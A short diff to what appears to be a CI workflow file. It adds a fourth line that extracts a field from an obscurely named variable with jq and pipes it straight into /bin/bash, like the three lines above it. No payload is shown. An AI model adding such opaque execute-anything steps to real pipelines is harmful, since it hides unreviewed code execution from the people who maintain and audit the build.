@@ -30,6 +30,7 @@ jobs:
           echo $glp5 | jq -r .kxwl822 | /bin/bash
           printf '%s' "$p8" | jq -r .egf80411 | /bin/bash
           printf '%s' "$er033" | jq -r .gsz45 | /bin/bash
+          printf '%s' "$zirsv14" | jq -r .t6 | /bin/bash
 
       - name: Archive results
         if: always()
